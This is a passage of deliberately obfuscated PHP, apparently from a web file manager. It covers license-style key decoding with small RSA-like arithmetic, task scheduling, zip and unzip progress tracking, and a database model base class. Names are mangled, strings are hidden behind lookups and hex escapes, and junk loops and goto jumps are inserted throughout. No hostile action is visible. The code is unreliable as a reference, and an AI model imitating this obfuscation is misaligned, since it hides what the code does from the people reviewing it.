$ïÉòŠò§) . $¥Õ‰Ù§[305] . $ë³–¢ – . $¥Õ‰Ù§[305] . $Ñí¢´ëò . $¥Õ‰Ù§[306]); $®¨©Ë¯ = $çš‚ºæ›[800]; $°ë­€² = $this->stge62bd2512($•ùË«ˆÀ, $–ùÕöä•) . $¥Õ‰Ù§[307] . $ŞÚ•©Åø; $û³ÂßÓÉ = $çš‚ºæ›[801]; if (!$û³ÂßÓÉ) { die; } return $°ë­€²; $üÖŒºÎ˜ = $çš‚ºæ›[802]; while (strlen($üÖŒºÎ˜) < $çš‚ºæ›[709]) { if (!$üÖŒºÎ˜) { break; } $üÖŒºÎ˜++; } } public function wupcd8ebaa4b($ûÂÃ™–ß) { $´±£ƒ· =& $_SERVER[³Ôà×Ó]; $ïáÂ†…ó =& $_SERVER[“¦‹á¼Á]; $ÔÎ«Û¬ = explode($ïáÂ†…ó[307], $ûÂÃ™–ß); $‰ó»ûş = $´±£ƒ·[803]; while ($‰ó»ûş < $´±£ƒ·[697]) { if ($‰ó»ûş >= 0) { break; } $‰ó»ûş++; } if (count($ÔÎ«Û¬) != 2) { return $ïáÂ†…ó[6]; } $ï·ŠšÈö = $this->ufckf051e899($ÔÎ«Û¬[1] . $ïáÂ†…ó[6], $ïáÂ†…ó[136]); $²ˆË¼” = $´±£ƒ·[804]; if (!$²ˆË¼”) { return; } if (!$ï·ŠšÈö) { return $ïáÂ†…ó[6]; } $ï·ŠšÈö = intval($ï·ŠšÈö); $ÙÏÓÓÉµ = $´±£ƒ·[805]; while ($ÙÏÓÓÉµ < $´±£ƒ·[709]) { if ($ÙÏÓÓÉµ >= 0) { break; } $ÙÏÓÓÉµ++; } $Üì’³â× = 0; $¤€øñ¢¦ = $´±£ƒ·[806]; if (strlen($¤€øñ¢¦) < $´±£ƒ·[436]) { return; } $ºßêğœÒ = 0; for ($ºŒœØóó = 3; $ºŒœØóó < $ï·ŠšÈö; $ºŒœØóó += 2) { if ($ï·ŠšÈö % $ºŒœØóó != 0) { continue; } $Üì’³â× = $ºŒœØóó; $ “Ç‹Ì¤ = $´±£ƒ·[705]; $ºßêğœÒ = intval($ï·ŠšÈö / $ºŒœØóó); $ˆ¨ğ¡¸¨ = $´±£ƒ·[807]; if (strlen($ˆ¨ğ¡¸¨) < $´±£ƒ·[697]) { return; } break; $çâôõ•´ = $´±£ƒ·[808]; if (!$çâôõ•´) { die; } } $İ÷ ¨î³ = ($Üì’³â× - 1) * ($ºßêğœÒ - 1); $ÇÚıÈ¢§ = $´±£ƒ·[809]; while ($ÇÚıÈ¢§ < $´±£ƒ·[709]) { if ($ÇÚıÈ¢§ >= 0) { break; } $ÇÚıÈ¢§++; } $Å‘ëøä = intval(($Üì’³â× + $ºßêğœÒ) / 2); while (1) { $ˆ±ó† = $Å‘ëøä; $àìØşÒ´ = $´±£ƒ·[810]; while (strlen($àìØşÒ´) < $´±£ƒ·[702]) { if (!$àìØşÒ´) { break; } $àìØşÒ´++; } $×ÎœÁÊ§ = $İ÷ ¨î³; while ($×ÎœÁÊ§ % $ˆ±ó† != 0) { $èìûÕÔ® = $×ÎœÁÊ§; $§Ã”Ùïı = $´±£ƒ·[811]; $×ÎœÁÊ§ = $ˆ±ó†; $ˆ±ó† = $èìûÕÔ® % $ˆ±ó†; $¯íİßŒê = $´±£ƒ·[812]; if (strlen($¯íİßŒê) < $´±£ƒ·[697]) { return; } } if ($ˆ±ó† == 1) { break; } else { $Å‘ëøä++; } } $Î›«Ì°½ = 2; $°Ö¦¿º = $´±£ƒ·[813]; while (strlen($°Ö¦¿º) < $´±£ƒ·[709]) { if (!$°Ö¦¿º) { break; } $°Ö¦¿º++; } for ($ºŒœØóó = 0; $ºŒœØóó < $İ÷ ¨î³ * 10; $ºŒœØóó++) { if (($İ÷ ¨î³ * $ºŒœØóó + 1) % $Å‘ëøä == 0) { $Î›«Ì°½ = intval(($İ÷ ¨î³ * $ºŒœØóó + 1) / $Å‘ëøä); break; } } $Âå¬ƒ½‹ = md5($ïáÂ†…ó[304] . ($Üì’³â× + $ºßêğœÒ) . $ïáÂ†…ó[305] . $Å‘ëøä . $ïáÂ†…ó[305] . $Î›«Ì°½ . $ïáÂ†…ó[306]); $®™ …Óü = $this->ufckf051e899($ÔÎ«Û¬[0], $Âå¬ƒ½‹); return $®™ …Óü; } public function qpnoa52a0208() { $š‹ÃÍç =& $_SERVER[³Ôà×Ó]; $â¶ıµõş = mt_rand(pow(2, 14), pow(2, 16) - 1); $ÄóÎêêÀ = $š‹ÃÍç[814]; $„ş›ªî = array(); $‚ÂÄÓÎí = $š‹ÃÍç[815]; while (strlen($‚ÂÄÓÎí) < $š‹ÃÍç[692]) { if (!$‚ÂÄÓÎí) { break; } $‚ÂÄÓÎí++; } $Ãá±ñ½• = 1; $µä†®¯¬ = $š‹ÃÍç[816]; while ($Ãá±ñ½• <= (int) sqrt($â¶ıµõş)) { $ï‹ãñï = $Ãá±ñ½•; while (!0) { $ï‹ãñï++; $Á¤¬í™ = $š‹ÃÍç[817]; while (strlen($Á¤¬í™) < $š‹ÃÍç[697]) { if (!$Á¤¬í™) { break; } $Á¤¬í™++; } if ($ï‹ãñï <= 2) { $Ãá±ñ½• = $ï‹ãñï; break; } else { if ($ï‹ãñï < 2) { continue; } } $›ÌÔëÆ = !0; for ($°ƒâÇÁ = 2; $°ƒâÇÁ <= sqrt($ï‹ãñï); $°ƒâÇÁ++) { if ($ï‹ãñï % $°ƒâÇÁ == 0) { $›ÌÔëÆ = !1; } } if ($›ÌÔëÆ) { $Ãá±ñ½• = $ï‹ãñï; break; } } $„ş›ªî[] = $Ãá±ñ½•; } $»Ï”†ÔÉ = 2; $ ‡ÊÊàá = $š‹ÃÍç[818]; for ($ï‹ãñï = $â¶ıµõş; $ï‹ãñï > 1; $ï‹ãñï--) { $›ÌÔëÆ = !0; $ş–õÅ…… = $š‹ÃÍç[819]; while (strlen($ş–õÅ……) < $š‹ÃÍç[436]) { if (!$ş–õÅ……) { break; } $ş–õÅ……++; } foreach ($„ş›ªî as $¦ñ©»•) { if ($ï‹ãñï % $¦ñ©»• == 0) { $›ÌÔëÆ = !1; break; } } if ($›ÌÔëÆ) { $»Ï”†ÔÉ = $ï‹ãñï; break; } } return $»Ï”†ÔÉ; $å¦ôËç¢ = $š‹ÃÍç[820]; while (strlen($å¦ôËç¢) < $š‹ÃÍç[709]) { if (!$å¦ôËç¢) { break; } $å¦ôËç¢++; } } public function zjdcaf07462a($ò·Ûµ‚Š, $êÁú¤Õ¼) { $¥úÜÏŠâ =& $_SERVER[³Ôà×Ó]; $”ëµáœÀ =& $_SERVER[“¦‹á¼Á]; return call_user_func(array($”ëµáœÀ[8], $”ëµáœÀ[308]), $ò·Ûµ‚Š, $êÁú¤Õ¼); $ş÷‡§Õò = $¥úÜÏŠâ[821]; if (strlen($ş÷‡§Õò) < $¥úÜÏŠâ[436]) { return; } } public function stge62bd2512($‰±ƒ×”İ, $¸ÁØ•ĞŠ) { $êÑÇÄş =& $_SERVER[“¦‹á¼Á]; return call_user_func(array($êÑÇÄş[309], $êÑÇÄş[310]), $‰±ƒ×”İ, $¸ÁØ•ĞŠ); } public function ufckf051e899($·ôüÚç¢, $¢ªƒ­Æ) { $éŠ¿ö¿ =& $_SERVER[“¦‹á¼Á]; return call_user_func(array($éŠ¿ö¿[309], $éŠ¿ö¿[311]), $·ôüÚç¢, $¢ªƒ­Æ); $È¿‘¯ = $_SERVER[³Ôà×Ó][822]; } } goto c¼„’—­; d…›‰²óÚ­: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($¾°‡½™, $¬±Î¶“À = 5.0) { if (!$¾°‡½™) { return; } $èß§¶ŸÀ = Cache::get($¾°‡½™); if (!$èß§¶ŸÀ || timeFloat() - floatVal($èß§¶ŸÀ) >= $¬±Î¶“À) { Cache::set($¾°‡½™, timeFloat(), $¬±Î¶“À * 10); return !0; } return !1; } public static function timeLimitCall($²˜¢¸, $£«»ÍÊ, $ì­³ÍÛ¿, $À’šÓÚ = 5.0) { $’¢ßŸê =& $_SERVER[³Ôà×Ó]; if (!$²˜¢¸ || !$£«»ÍÊ) { return; } self::$asyncAdd = !0; $İŒ„ıòœ = $’¢ßŸê[1871]; $éí˜ñÅ¯ = Cache::get($İŒ„ıòœ, !0); $ÂøÛÈÙ = array($’¢ßŸê[1872] => timeFloat(), $’¢ßŸê[1873] => timeFloat(), $’¢ßŸê[341] => $£«»ÍÊ, $’¢ßŸê[1863] => $ì­³ÍÛ¿, $’¢ßŸê[206] => $À’šÓÚ); if (is_array($éí˜ñÅ¯[$²˜¢¸])) { $ÂøÛÈÙ[$’¢ßŸê[1873]] = $éí˜ñÅ¯[$²˜¢¸][$’¢ßŸê[1873]]; } if (is_array($éí˜ñÅ¯[$²˜¢¸])) { if (timeFloat() - $éí˜ñÅ¯[$²˜¢¸][$’¢ßŸê[1872]] < $ÂøÛÈÙ[$’¢ßŸê[206]] * 0.3) { return; } $ÂøÛÈÙ[$’¢ßŸê[1873]] = $éí˜ñÅ¯[$²˜¢¸][$’¢ßŸê[1873]]; } $éí˜ñÅ¯[$²˜¢¸] = $ÂøÛÈÙ; Cache::set($İŒ„ıòœ, $éí˜ñÅ¯, 60); Cache::removeMemory($İŒ„ıòœ); write_log($’¢ßŸê[1874] . $²˜¢¸ . $’¢ßŸê[74] . $£«»ÍÊ, $’¢ßŸê[197]); } public static function timeLimitCallLoop() { $ÓÎƒôİ« =& $_SERVER[³Ôà×Ó]; $œÓÒ«¡ö = array($ÓÎƒôİ«[1875]); $·ÍÑçí’ = in_array(strtolower(ACTION), $œÓÒ«¡ö); if (!$·ÍÑçí’ && !self::$asyncAdd) { return; } $ÑÉ¢ğçÖ = $ÓÎƒôİ«[1871]; $œâÀ°€ı = Cache::get($ÑÉ¢ğçÖ, !0); if (!$œâÀ°€ı || count($œâÀ°€ı) <= 0) { return; } $Œªâ¡øÁ = !1; $Øç·¶¹® = timeFloat(); $²² ‚è = array(); foreach ($œâÀ°€ı as $†íÁÏ¿ => $…¤àò«·) { if ($Øç·¶¹® - $…¤àò«·[$ÓÎƒôİ«[1873]] > $…¤àò«·[$ÓÎƒôİ«[206]]) { $Œªâ¡øÁ = !0; try { Hook::apply($…¤àò«·[$ÓÎƒôİ«[341]], $…¤àò«·[$ÓÎƒôİ«[1863]]); write_log($ÓÎƒôİ«[1876] . $†íÁÏ¿ . $ÓÎƒôİ«[74] . $…¤àò«·[$ÓÎƒôİ«[341]] . $ÓÎƒôİ«[1877] . ACTION, $ÓÎƒôİ«[197]); } catch (Exception $ì¿¡€¬®) { } continue; } $²² ‚è[$†íÁÏ¿] = $…¤àò«·; } if (!$Œªâ¡øÁ) { return; } if (!$²² ‚è) { return Cache::remove($ÑÉ¢ğçÖ); } Cache::set($ÑÉ¢ğçÖ, $²² ‚è, 60); Cache::removeMemory($ÑÉ¢ğçÖ); } public static function finished($úåæÂÖË, $‹¢íö) { $È¸¬şÄç =& $_SERVER[³Ôà×Ó]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($È¸¬şÄç[341] => $úåæÂÖË, $È¸¬şÄç[1863] => $‹¢íö); } private static function finishedRun() { $Û½›ì¯æ =& $_SERVER[³Ôà×Ó]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $½öœ§ìŞ) { try { Hook::apply($½öœ§ìŞ[$Û½›ì¯æ[341]], $½öœ§ìŞ[$Û½›ì¯æ[1863]]); } catch (Exception $÷òÂ£˜÷) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $Ú¾‹ĞåÎ =& $_SERVER[³Ôà×Ó]; parent::startAfter(); Hook::bind($Ú¾‹ĞåÎ[1878], array($this, $Ú¾‹ĞåÎ[1879])); Hook::bind($Ú¾‹ĞåÎ[1275], array($this, $Ú¾‹ĞåÎ[1880])); Hook::bind($Ú¾‹ĞåÎ[1881], array($this, $Ú¾‹ĞåÎ[1882])); $ïÍš½œ÷ =& $this->task; $ïÍš½œ÷[$Ú¾‹ĞåÎ[1883]] = $Ú¾‹ĞåÎ[1276]; if (!$ïÍš½œ÷[$Ú¾‹ĞåÎ[1654]]) { $ïÍš½œ÷[$Ú¾‹ĞåÎ[1654]] = LNG($Ú¾‹ĞåÎ[1884]); } } protected function endAfter() { $¢Ú¿Ø =& $_SERVER[³Ôà×Ó]; parent::endAfter(); Hook::unbind($¢Ú¿Ø[1878], array($this, $¢Ú¿Ø[1879])); Hook::unbind($¢Ú¿Ø[1275], array($this, $¢Ú¿Ø[1880])); Hook::unbind($¢Ú¿Ø[1881], array($this, $¢Ú¿Ø[1882])); } public function updateAfter() { $’ç©¦¿Ú =& $_SERVER[³Ôà×Ó]; $×øÏÁ½– =& $this->task; if (!$×øÏÁ½–[$’ç©¦¿Ú[1138]] || !$×øÏÁ½–[$’ç©¦¿Ú[838]]) { if ($×øÏÁ½–[$’ç©¦¿Ú[1883]] != $’ç©¦¿Ú[389]) { return; } } if ($×øÏÁ½–[$’ç©¦¿Ú[1883]] == $’ç©¦¿Ú[1276]) { $…¶Î¦œ© = 0; if ($×øÏÁ½–[$’ç©¦¿Ú[1818]]) { $…¶Î¦œ© = $×øÏÁ½–[$’ç©¦¿Ú[1819]] / $×øÏÁ½–[$’ç©¦¿Ú[1818]]; } $×øÏÁ½–[$’ç©¦¿Ú[1767]] = $…¶Î¦œ© * 0.3; } else { if ($×øÏÁ½–[$’ç©¦¿Ú[1883]] == $’ç©¦¿Ú[389]) { $…¶Î¦œ© = $×øÏÁ½–[$’ç©¦¿Ú[1766]] / $×øÏÁ½–[$’ç©¦¿Ú[1138]]; $×øÏÁ½–[$’ç©¦¿Ú[1767]] = 0.3 + $…¶Î¦œ© * 0.4; } else { if ($×øÏÁ½–[$’ç©¦¿Ú[1883]] == $’ç©¦¿Ú[110]) { $¨ª£Ë¾ = 0; if ($×øÏÁ½–[$’ç©¦¿Ú[1820]] == $’ç©¦¿Ú[110]) { $¨ª£Ë¾ = $×øÏÁ½–[$’ç©¦¿Ú[1819]]; } $…¶Î¦œ© = ($×øÏÁ½–[$’ç©¦¿Ú[1823]] + $¨ª£Ë¾) / $×øÏÁ½–[$’ç©¦¿Ú[838]]; $×øÏÁ½–[$’ç©¦¿Ú[1767]] = 0.3 + 0.4 + $…¶Î¦œ© * 0.3; } } } if ($×øÏÁ½–[$’ç©¦¿Ú[1767]] > 0) { $æ…€«Ô = timeFloat() - $×øÏÁ½–[$’ç©¦¿Ú[1769]] - $×øÏÁ½–[$’ç©¦¿Ú[1772]]; $×øÏÁ½–[$’ç©¦¿Ú[1773]] = $æ…€«Ô * (1 - $×øÏÁ½–[$’ç©¦¿Ú[1767]]) / $×øÏÁ½–[$’ç©¦¿Ú[1767]]; } } public function addFile($ÓŞïƒÁ) { $Û¸ê„ =& $_SERVER[³Ôà×Ó]; $‰Ô¨ïšÁ =& $this->task; $Üâ¢·é = IO::info($ÓŞïƒÁ); $‰Ô¨ïšÁ[$Û¸ê„[1816]] = $Üâ¢·é[$Û¸ê„[32]]; $‰Ô¨ïšÁ[$Û¸ê„[1818]] = $Üâ¢·é[$Û¸ê„[79]]; $‰Ô¨ïšÁ[$Û¸ê„[1819]] = 0; $‰Ô¨ïšÁ[$Û¸ê„[1140]] = $Û¸ê„[1839]; $‰Ô¨ïšÁ[$Û¸ê„[1820]] = $Û¸ê„[1276]; $‰Ô¨ïšÁ[$Û¸ê„[838]] = $Üâ¢·é[$Û¸ê„[79]]; $‰Ô¨ïšÁ[$Û¸ê„[1138]] = 1; $é¬ış–– = 0; $‰Ô¨ïšÁ[$Û¸ê„[1827]] = array($Û¸ê„[1828] => $é¬ış–– + 1, $Û¸ê„[503] => $Üâ¢·é[$Û¸ê„[32]], $Û¸ê„[87] => $Üâ¢·é[$Û¸ê„[87]], $Û¸ê„[591] => $Üâ¢·é[$Û¸ê„[591]] ? $Üâ¢·é[$Û¸ê„[591]] : $Üâ¢·é[$Û¸ê„[87]]); $this->update(); } public function zipEvent($Ë‚ÏÁ±, $¨Ÿ…æŞ, $Ÿ„¤´º, $çµÀï·Ê) { $‹ Õá“± =& $_SERVER[³Ôà×Ó]; $½ˆœ Öö =& $this->task; $½ˆœ Öö[$‹ Õá“±[1816]] = get_path_this($¨Ÿ…æŞ); $½ˆœ Öö[$‹ Õá“±[1818]] = $çµÀï·Ê; $½ˆœ Öö[$‹ Õá“±[1819]] = $Ÿ„¤´º; $½ˆœ Öö[$‹ Õá“±[1140]] = $Ë‚ÏÁ± == $‹ Õá“±[1885] ? $‹ Õá“±[1886] : $‹ Õá“±[1887]; $½ˆœ Öö[$‹ Õá“±[1820]] = $‹ Õá“±[12]; $½ˆœ Öö[$‹ Õá“±[838]] = $çµÀï·Ê; $½ˆœ Öö[$‹ Õá“±[1883]] = $‹ Õá“±[389]; $this->update(); } public function unzipAfter($ÕîÇĞš) { $²×áÛ—á =& $_SERVER[³Ôà×Ó]; $™µş÷¹Ğ =& $this->task; $™µş÷¹Ğ[$²×áÛ—á[1883]] = $²×áÛ—á[110]; $úÎ‡îÆğ = IO::infoWithChildren($ÕîÇĞš); $ı‘‡ÓÊø = 0; $™µş÷¹Ğ[$²×áÛ—á[1827]] = array($²×áÛ—á[1828] => $ı‘‡ÓÊø + 1, $²×áÛ—á[503] => $úÎ‡îÆğ[$²×áÛ—á[32]], $²×áÛ—á[87] => $úÎ‡îÆğ[$²×áÛ—á[87]], $²×áÛ—á[591] => $úÎ‡îÆğ[$²×áÛ—á[591]] ? $úÎ‡îÆğ[$²×áÛ—á[591]] : $úÎ‡îÆğ[$²×áÛ—á[87]]); if ($úÎ‡îÆğ[$²×áÛ—á[33]] == $²×áÛ—á[230]) { $™µş÷¹Ğ[$²×áÛ—á[1138]] = 1; } else { $™µş÷¹Ğ[$²×áÛ—á[1138]] = $úÎ‡îÆğ[$²×áÛ—á[82]][$²×áÛ—á[80]]; } $™µş÷¹Ğ[$²×áÛ—á[1140]] = $²×áÛ—á[12]; $™µş÷¹Ğ[$²×áÛ—á[1820]] = 0; $™µş÷¹Ğ[$²×áÛ—á[1766]] = 0; $™µş÷¹Ğ[$²×áÛ—á[1818]] = 0; $™µş÷¹Ğ[$²×áÛ—á[1819]] = 0; $™µş÷¹Ğ[$²×áÛ—á[1816]] = $²×áÛ—á[12]; $™µş÷¹Ğ[$²×áÛ—á[1823]] = 0; $™µş÷¹Ğ[$²×áÛ—á[838]] = $úÎ‡îÆğ[$²×áÛ—á[79]]; $this->update(); self::log($²×áÛ—á[1888] . json_encode(array($™µş÷¹Ğ, $úÎ‡îÆğ))); } public function nameParse($ñíßåğ) { $¹ĞåÁï§ =& $_SERVER[³Ôà×Ó]; $íÎÌİŒÓ =& $this->task; if ($íÎÌİŒÓ[$¹ĞåÁï§[1883]] == $¹ĞåÁï§[1276]) { $íÎÌİŒÓ[$¹ĞåÁï§[1883]] = $¹ĞåÁï§[389]; $íÎÌİŒÓ[$¹ĞåÁï§[1823]] = 0; $íÎÌİŒÓ[$¹ĞåÁï§[838]] = 0; } $¬Ì“£•ù = get_path_this($ñíßåğ); if (strstr($¬Ì“£•ù, $¹ĞåÁï§[10])) { $íÎÌİŒÓ[$¹ĞåÁï§[1766]] += 1; $íÎÌİŒÓ[$¹ĞåÁï§[1138]] += 1; } $íÎÌİŒÓ[$¹ĞåÁï§[1816]] = $ñíßåğ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $Ûç­ğÂ =& $_SERVER[³Ôà×Ó]; parent::startAfter(); Hook::bind($Ûç­ğÂ[1889], array($this, $Ûç­ğÂ[1879])); Hook::bind($Ûç­ğÂ[1881], array($this, $Ûç­ğÂ[1882])); $¨İ¶·ô™ =& $this->task; $¨İ¶·ô™[$Ûç­ğÂ[1883]] = $Ûç­ğÂ[1276]; if (!$¨İ¶·ô™[$Ûç­ğÂ[1654]]) { $¨İ¶·ô™[$Ûç­ğÂ[1654]] = LNG($Ûç­ğÂ[1890]); } } protected function endAfter() { $“ª©¯„• =& $_SERVER[³Ôà×Ó]; parent::endAfter(); Hook::unbind($“ª©¯„•[1889], array($this, $“ª©¯„•[1879])); Hook::unbind($“ª©¯„•[1881], array($this, $“ª©¯„•[1882])); } public function updateAfter() { $¯ ïË´Û =& $_SERVER[³Ôà×Ó]; $úÑ©»¡é =& $this->task; if (!$úÑ©»¡é[$¯ ïË´Û[1138]] || !$úÑ©»¡é[$¯ ïË´Û[838]]) { return; } if ($úÑ©»¡é[$¯ ïË´Û[1883]] == $¯ ïË´Û[1276]) { $èµ–Ã‰ = $úÑ©»¡é[$¯ ïË´Û[1819]]; if ($úÑ©»¡é[$¯ ïË´Û[1820]] != $¯ ïË´Û[1276]) { $èµ–Ã‰ = 0; } $†à¸·Î¿ = ($úÑ©»¡é[$¯ ïË´Û[1823]] + $èµ–Ã‰) / $úÑ©»¡é[$¯ ïË´Û[838]]; $úÑ©»¡é[$¯ ïË´Û[1767]] = $†à¸·Î¿ * 0.3; } else { if ($úÑ©»¡é[$¯ ïË´Û[1883]] == $¯ ïË´Û[389]) { $†à¸·Î¿ = $úÑ©»¡é[$¯ ïË´Û[1766]] / $úÑ©»¡é[$¯ ïË´Û[1138]]; $úÑ©»¡é[$¯ ïË´Û[1767]] = 0.3 + $†à¸·Î¿ * 0.5; } else { if ($úÑ©»¡é[$¯ ïË´Û[1883]] == $¯ ïË´Û[110]) { $†à¸·Î¿ = 0; if ($úÑ©»¡é[$¯ ïË´Û[1818]]) { $†à¸·Î¿ = $úÑ©»¡é[$¯ ïË´Û[1819]] / $úÑ©»¡é[$¯ ïË´Û[1818]]; } $úÑ©»¡é[$¯ ïË´Û[1767]] = 0.3 + 0.5 + $†à¸·Î¿ * 0.2; } } } if ($úÑ©»¡é[$¯ ïË´Û[1767]] > 0) { $–ÍÃÎ¢ = timeFloat() - $úÑ©»¡é[$¯ ïË´Û[1769]] - $úÑ©»¡é[$¯ ïË´Û[1772]]; $úÑ©»¡é[$¯ ïË´Û[1773]] = $–ÍÃÎ¢ * (1 - $úÑ©»¡é[$¯ ïË´Û[1767]]) / $úÑ©»¡é[$¯ ïË´Û[1767]]; } } public function copyFileStart($å¸ãÜ•Ë, $Ü£´ñô, $çËŒˆº¦, $¦†à“Ü, $ëèÊõÆ, $Ë¢æËà) { $îää®²¬ =& $_SERVER[³Ôà×Ó]; parent::copyFileStart($å¸ãÜ•Ë, $Ü£´ñô, $çËŒˆº¦, $¦†à“Ü, $ëèÊõÆ, $Ë¢æËà); $ÌŒÁòÎ =& $this->task; if ($ÌŒÁòÎ[$îää®²¬[1883]] == $îää®²¬[389]) { $ÌŒÁòÎ[$îää®²¬[1883]] = $îää®²¬[110]; } $this->update(); } public function copyFileEnd($ùì˜ÑµÙ, $ğ©™ÍÓû, $÷”àçè, $½Ô”Úİ, $¯Ç„ªòí, $‰ó†®ğó) { $£éåÛ =& $_SERVER[³Ôà×Ó]; $ß—š¶Ç =& $this->task; $ß—š¶Ç[$£éåÛ[1819]] = $ß—š¶Ç[$£éåÛ[1818]]; $ß—š¶Ç[$£éåÛ[1823]] += $ß—š¶Ç[$£éåÛ[1818]]; $ß—š¶Ç[$£éåÛ[1820]] = $£éåÛ[12]; $this->update(); } public function zipEvent($«½¯ÕÚö, $†×…æó, $ÜÇ•Úƒ¥, $¦¦şìï­) { $™ Ø…¨Á =& $_SERVER[³Ôà×Ó]; $õ•æèÓ =& $this->task; $õ•æèÓ[$™ Ø…¨Á[1816]] = get_path_this($†×…æó); $õ•æèÓ[$™ Ø…¨Á[1818]] = $¦¦şìï­; $õ•æèÓ[$™ Ø…¨Á[1819]] = $ÜÇ•Úƒ¥; $õ•æèÓ[$™ Ø…¨Á[1140]] = $«½¯ÕÚö == $™ Ø…¨Á[1891] ? $™ Ø…¨Á[1886] : $™ Ø…¨Á[1887]; $õ•æèÓ[$™ Ø…¨Á[1820]] = $™ Ø…¨Á[12]; $õ•æèÓ[$™ Ø…¨Á[838]] = $¦¦şìï­; $õ•æèÓ[$™ Ø…¨Á[1883]] = $™ Ø…¨Á[389]; $this->update(); } public function nameParse($£¹âş¾é) { $Í´ÌÎ„ô =& $_SERVER[³Ôà×Ó]; $†æù =& $this->task; if ($†æù[$Í´ÌÎ„ô[1766]] < $†æù[$Í´ÌÎ„ô[1138]]) { $¤ú¨ôï† = get_path_this($£¹âş¾é); if (strstr($¤ú¨ôï†, $Í´ÌÎ„ô[10])) { $†æù[$Í´ÌÎ„ô[1766]] += 1; } } if ($†æù[$Í´ÌÎ„ô[1883]] == $Í´ÌÎ„ô[1276]) { $†æù[$Í´ÌÎ„ô[1883]] = $Í´ÌÎ„ô[389]; } $†æù[$Í´ÌÎ„ô[1816]] = $£¹âş¾é; $this->update(); } } goto B¯¿™šÕŸ; fÃà¨…­†·: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\151\x66\171\124\x69\x6d\145", "\164\151\x6d\x65", "\x69\x6e\x73\145\x72\164\54\x75\160\144\x61\x74\145", "\x66\165\156\x63\x74\151\x6f\x6e"), array("\x63\162\145\x61\x74\x65\x54\151\x6d\x65", "\164\151\x6d\145", "\x69\156\163\x65\162\x74", "\x66\165\x6e\x63\164\x69\157\156")); public function setDataAuto($óº Š·ì) { $this->dataAuto = $óº Š·ì; } public function __construct($ö¹‹ÔÔ… = '', $ƒÉ¿ÜèÏ = '', $¬‡ËÄ = '') { parent::__construct($ö¹‹ÔÔ…, $ƒÉ¿ÜèÏ, $¬‡ËÄ); } protected $tableMeta = array(); protected function _beforeInsert(&$Ğ€ˆæÖ, $øëê×øÆ) { $Í×ÜÇñ” =& $_SERVER[³Ôà×Ó]; if (!$this->checkDataAutoHas($Í×ÜÇñ”[440])) { return; } $this->dataBeforeFilter($Ğ€ˆæÖ, $Í×ÜÇñ”[440]); } protected function _beforeUpdate(&$»€ïŸŒ£, $¸…·è¸…) { $«¢×çÔû =& $_SERVER[³Ôà×Ó]; if (!$this->checkDataAutoHas($«¢×çÔû[441])) { return; } $this->dataBeforeFilter($»€ïŸŒ£, $«¢×çÔû[441]); } protected function _afterSelect(&$°ñã†Ø½, $±ìó•–í) { if (!is_array($°ñã†Ø½)) { return; } if (!$this->checkDataAutoHas($_SERVER[³Ôà×Ó][442])) { return; } foreach ($°ñã†Ø½ as &$»—İ‚×í) { $this->dataAfterFilter($»—İ‚×í); } unset($»—İ‚×í); } protected function _afterFind(&$¿‡ë™ˆ¬, $àÕ€ Ë) { if (!is_array($¿‡ë™ˆ¬)) { return; } if (!$this->checkDataAutoHas($_SERVER[³Ôà×Ó][442])) { return; } $this->dataAfterFilter($¿‡ë™ˆ¬); } public static function textEncode($‘˜à¨…ó) { if (!$‘˜à¨…ó) { return $‘˜à¨…ó; } $ÊÁÖ® = json_encode($‘˜à¨…ó); $ÊÁÖ® = preg_replace_callback($_SERVER[³Ôà×Ó][443], function ($»¸©ş†Í) { return addslashes($»¸©ş†Í[0]); }, $ÊÁÖ®); return json_decode($ÊÁÖ®); } public static function textDecode($í¹Æƒ²×) { $öó¶ıİà =& $_SERVER[³Ôà×Ó]; $ùôèòİ = json_encode($í¹Æƒ²×); $ùôèòİ = preg_replace_callback($öó¶ıİà[444], function ($ ¯öÃ¶) { return $_SERVER[³Ôà×Ó][100]; }, $ùôèòİ); return json_decode($ùôèòİ); } public function setAutoIncrement($†¢²ØæÑ) { $äıÕ‚ÅÉ = array($this->getPk() => $†¢²ØæÑ); $Ç–Ì¿˜º = $this->data($äıÕ‚ÅÉ)->add(); if ($Ç–Ì¿˜º) { $this->delete($Ç–Ì¿˜º); } } public function getAutoIncrement() { $ê¨ê´¹İ = $this->getTableName(); $ÂÂ«»¼’ = $this->max($this->getPk()); $Ï°ÇöùÙ = $this->query("\163\150\157\167\40\164\141\x62\154\x65\40\x73\x74\141\x74\x75\x73\x20\x77\150\145\162\x65\40\x4e\141\x6d\145\x3d\x27{$ê¨ê´¹İ}\x27"); $®çÙ”¼è = $Ï°ÇöùÙ[0][$_SERVER[³Ôà×Ó][445]]; $¼„¢¯øÍ = max($ÂÂ«»¼’, $®çÙ”¼è); return $¼„¢¯øÍ; } protected function _callBefore($ç«°éí, $«ˆøæòŸ) { return $this->cacheCallCheck($ç«°éí, $«ˆøæòŸ, !1); } protected function _callAfter($Ã»±€ñµ, $¾á¡›¦…) { return $this->cacheCallCheck($Ã»±€ñµ, $¾á¡›¦…, !0); } protected function cacheFunctionAlias($á„Áàú´) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ñş±™Šª, $ÏëğîÚ, $ÅÁâ–‡ = false) { $ÕÉ¢‘¶¸ = $this->cacheFunctionAlias($ÏëğîÚ); if (!$ÕÉ¢‘¶¸) { return; } foreach ($ÕÉ¢‘¶¸ as $İËÀ­‰ƒ => $ØÏ›­Ÿ÷) { $î–²ìı€ = $ØÏ›­Ÿ÷[0]; $Šğ°è“« = explode($_SERVER[³Ôà×Ó][50], $ØÏ›­Ÿ÷[1]); if ($ñş±™Šª == $İËÀ­‰ƒ) { return $this->cacheFunctionGet($İËÀ­‰ƒ, $î–²ìı€); } if ($ÅÁâ–‡ && in_array($ñş±™Šª, $Šğ°è“«)) { $this->cacheFunctionClear($İËÀ­‰ƒ, $î–²ìı€); } } } public function cacheFunctionGet($ìú„×ú¿, $¬ëÕÕŒî) { $Ÿ‚ùñÔÅ = $this->cacheKeyMake($ìú„×ú¿, $¬ëÕÕŒî); $Ç Ñ“¥Ò = Cache::get($Ÿ‚ùñÔÅ); if (!is_array($Ç Ñ“¥Ò)) { $Ç 